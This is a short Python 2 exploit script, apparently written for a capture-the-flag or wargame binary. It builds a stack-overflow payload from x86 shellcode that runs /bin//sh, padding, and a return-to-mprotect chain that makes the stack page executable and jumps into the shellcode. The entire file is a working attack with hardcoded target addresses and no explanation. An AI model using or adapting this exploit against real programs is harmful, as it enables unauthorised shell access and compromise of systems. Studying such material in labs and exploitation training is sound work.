#!/usr/bin/python
import struct
def p(x):
        return struct.pack('<L',x)

PAYLOAD="jhh\x2f\x2f\x2fsh\x2fbin\x89\xe31\xc9j\x0bX\x99\xcd\x80"

BUFFER_ADDRESS=0xbffff730
BUFFER_ADDRESS_ALIGNED=0xbffff000

payload = ""
payload += PAYLOAD
while len(payload) < 32 + 4*3: # name size + arguments
        payload += "B"
payload += p(0x080523E0) # mprotect
payload += p(BUFFER_ADDRESS) # Jump to shellcode
payload += p(BUFFER_ADDRESS_ALIGNED)
payload += p(0x1000) # 4096
payload += p(0x7) # PROT_READ|PROT_WRITE|PROT_EXEC
print payload

